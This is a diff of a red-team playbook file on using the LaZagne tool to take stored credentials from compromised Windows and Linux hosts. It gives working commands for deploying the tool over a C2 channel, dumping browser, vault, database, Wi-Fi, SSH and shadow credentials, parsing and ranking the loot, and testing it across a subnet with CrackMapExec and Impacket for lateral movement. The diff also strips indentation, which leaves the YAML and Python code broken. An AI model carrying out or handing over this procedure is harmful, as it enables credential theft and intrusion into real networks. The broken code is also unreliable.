@@ -1,8 +1,8 @@
 ---
 name: performing-credential-access-with-lazagne
 description: Extract stored credentials from compromised endpoints using the LaZagne
-  post-exploitation tool to recover passwords from browsers, databases, system vaults,
-  and applications during authorized red team operations.
+ post-exploitation tool to recover passwords from browsers, databases, system vaults,
+ and applications during authorized red team operations.
 domain: cybersecurity
 subdomain: red-teaming
 tags:
@@ -33,36 +33,36 @@ mitre_attack:
 - T1078
 - T1021
 mitre_f3:
-  version: '1.1'
-  tactics:
-  - reconnaissance
-  - positioning
-  - initial-access
-  techniques:
-  - id: T1555
-    name: Credentials from Password Stores
-    tactic: reconnaissance
-    source: attack
-  - id: T1555.003
-    name: 'Credentials from Password Stores: Credentials from Web Browsers'
-    tactic: reconnaissance
-    source: attack
-  - id: T1555.005
-    name: 'Credentials from Password Stores: Password Managers'
-    tactic: reconnaissance
-    source: attack
-  - id: T1539
-    name: Steal Web Session Cookie
-    tactic: positioning
-    source: attack
-  - id: F1006.002
-    name: 'Account Takeover: Exposed Login Credential'
-    tactic: initial-access
-    source: f3
-  - id: F1006
-    name: Account Takeover
-    tactic: initial-access
-    source: f3
+ version: '1.1'
+ tactics:
+ - reconnaissance
+ - positioning
+ - initial-access
+ techniques:
+ - id: T1555
+ name: Credentials from Password Stores
+ tactic: reconnaissance
+ source: attack
+ - id: T1555.003
+ name: 'Credentials from Password Stores: Credentials from Web Browsers'
+ tactic: reconnaissance
+ source: attack
+ - id: T1555.005
+ name: 'Credentials from Password Stores: Password Managers'
+ tactic: reconnaissance
+ source: attack
+ - id: T1539
+ name: Steal Web Session Cookie
+ tactic: positioning
+ source: attack
+ - id: F1006.002
+ name: 'Account Takeover: Exposed Login Credential'
+ tactic: initial-access
+ source: f3
+ - id: F1006
+ name: Account Takeover
+ tactic: initial-access
+ source: f3
 ---
 # Performing Credential Access with LaZagne
 
@@ -108,108 +108,108 @@ LaZagne is an open-source post-exploitation tool designed to retrieve credential
 
 ### Phase 1: LaZagne Deployment
 1. Transfer LaZagne to the compromised host:
-   ```powershell
-   # Pre-compiled executable (Windows)
-   # Transfer lazagne.exe via C2 channel or file upload
+ ```powershell
+ # Pre-compiled executable (Windows)
+ # Transfer lazagne.exe via C2 channel or file upload
 
-   # Python version (requires Python on target)
-   git clone https://github.com/AlessandroZ/LaZagne.git
-   cd LaZagne
-   pip install -r requirements.txt
-   ```
+ # Python version (requires Python on target)
+ git clone https://github.com/AlessandroZ/LaZagne.git
+ cd LaZagne
+ pip install -r requirements.txt
+ ```
 2. Verify execution capability and privileges:
-   ```powershell
-   # Check current user context
-   whoami /priv
+ ```powershell
+ # Check current user context
+ whoami /priv
 
-   # LaZagne works with standard user privileges for user-level stores
-   # SYSTEM/Admin privileges needed for DPAPI master keys, LSA secrets, SAM
-   ```
+ # LaZagne works with standard user privileges for user-level stores
+ # SYSTEM/Admin privileges needed for DPAPI master keys, LSA secrets, SAM
+ ```
 
 ### Phase 2: Full Credential Extraction (Windows)
 1. Run LaZagne with all modules:
-   ```powershell
-   # Extract all credentials
-   lazagne.exe all
+ ```powershell
+ # Extract all credentials
+ lazagne.exe all
 
-   # Export results to JSON
-   lazagne.exe all -oJ
+ # Export results to JSON
+ lazagne.exe all -oJ
 
-   # Export results to specific file
-   lazagne.exe all -oJ -output C:\Temp\creds
-   ```
+ # Export results to specific file
+ lazagne.exe all -oJ -output C:\Temp\creds
+ ```
 2. Run specific modules for targeted extraction:
-   ```powershell
-   # Browsers only (Chrome, Firefox, Edge, Opera, IE)
-   lazagne.exe browsers
+ ```powershell
+ # Browsers only (Chrome, Firefox, Edge, Opera, IE)
+ lazagne.exe browsers
 
-   # Windows credential stores
-   lazagne.exe windows
+ # Windows credential stores
+ lazagne.exe windows
 
-   # Database credentials
-   lazagne.exe databases
+ # Database credentials
+ lazagne.exe databases
 
-   # Email client credentials
-   lazagne.exe mails
+ # Email client credentials
+ lazagne.exe mails
 
-   # Wi-Fi passwords
-   lazagne.exe wifi
+ # Wi-Fi passwords
+ lazagne.exe wifi
 
-   # Git credentials
-   lazagne.exe git
+ # Git credentials
+ lazagne.exe git
 
-   # System credentials (requires elevated privileges)
-   lazagne.exe sysadmin
-   ```
+ # System credentials (requires elevated privileges)
+ lazagne.exe sysadmin
+ ```
 
 ### Phase 3: Credential Extraction (Linux)
 1. Run LaZagne on Linux targets:
-   ```bash
-   # Full extraction
-   python3 laZagne.py all
+ ```bash
+ # Full extraction
+ python3 laZagne.py all
 
-   # Browser credentials
-   python3 laZagne.py browsers
+ # Browser credentials
+ python3 laZagne.py browsers
 
-   # System credentials (SSH keys, shadow file with root)
-   python3 laZagne.py sysadmin
+ # System credentials (SSH keys, shadow file with root)
+ python3 laZagne.py sysadmin
 
-   # Database credentials
-   python3 laZagne.py databases
+ # Database credentials
+ python3 laZagne.py databases
 
-   # Git credentials
-   python3 laZagne.py git
-   ```
+ # Git credentials
+ python3 laZagne.py git
+ ```
 
 ### Phase 4: Credential Analysis and Prioritization
 1. Parse JSON output for unique credentials:
-   ```python
-   import json
-   with open("creds.json") as f:
-       results = json.load(f)
-   for module in results:
-       for entry in module.get("results", []):
-           print(f"Source: {entry.get('Category')}")
-           print(f"  User: {entry.get('Login', 'N/A')}")
-           print(f"  URL/Host: {entry.get('URL', entry.get('Host', 'N/A'))}")
-   ```
+ ```python
+ import json
+ with open("creds.json") as f:
+ results = json.load(f)
+ for module in results:
+ for entry in module.get("results", []):
+ print(f"Source: {entry.get('Category')}")
+ print(f" User: {entry.get('Login', 'N/A')}")
+ print(f" URL/Host: {entry.get('URL', entry.get('Host', 'N/A'))}")
+ ```
 2. Prioritize credentials by value:
-   - Domain credentials (AD accounts) for lateral movement
-   - Cloud service credentials (AWS, Azure, GCP console)
-   - VPN and remote access credentials
-   - Database credentials for data access
-   - Email credentials for business email compromise
-   - Service account credentials for privilege escalation
+ - Domain credentials (AD accounts) for lateral movement
+ - Cloud service credentials (AWS, Azure, GCP console)
+ - VPN and remote access credentials
+ - Database credentials for data access
+ - Email credentials for business email compromise
+ - Service account credentials for privilege escalation
 
 ### Phase 5: Credential Validation and Use
 1. Validate recovered domain credentials:
-   ```bash
-   # Test domain credentials with CrackMapExec
-   crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_pass'
+ ```bash
+ # Test domain credentials with CrackMapExec
+ crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_pass'
 
-   # Test with Impacket
-   smbclient.py domain.local/user:'password'@10.10.10.1
-   ```
+ # Test with Impacket
+ smbclient.py domain.local/user:'password'@10.10.10.1
+ ```
 2. Cross-reference with BloodHound paths for high-value targets
 3. Use recovered credentials for lateral movement or privilege escalation
 
